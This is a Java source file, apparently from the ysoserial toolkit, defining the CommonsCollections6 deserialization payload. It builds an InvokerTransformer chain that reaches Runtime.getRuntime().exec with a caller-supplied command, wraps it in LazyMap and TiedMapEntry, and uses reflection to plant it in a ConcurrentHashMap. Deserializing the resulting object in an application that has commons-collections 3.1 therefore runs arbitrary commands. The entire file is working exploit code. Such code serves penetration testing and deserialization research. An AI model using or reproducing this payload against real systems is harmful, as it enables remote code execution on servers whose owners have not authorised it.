package ysoserial.payloads;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

import java.util.concurrent.ConcurrentHashMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<ConcurrentHashMap> {

    public ConcurrentHashMap getObject(String command) throws Exception {
        final String[] execArgs = new String[] { command };
        
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                    String.class, Class[].class }, new Object[] {
                    "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                    Object.class, Object[].class }, new Object[] {
                    null, new Object[0] }),
                new InvokerTransformer("exec",
                    new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        
        final Transformer transformerChain = new ChainedTransformer(
                transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        ConcurrentHashMap map = new ConcurrentHashMap(1);
        map.put("dummy1", "dummy1");
        Field f = ConcurrentHashMap.class.getDeclaredField("table");
        f.setAccessible(true);
        Object[] array = (Object[]) f.get(map);

        Object node = array[1];
        Field keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, entry);
        return map;
    }

}
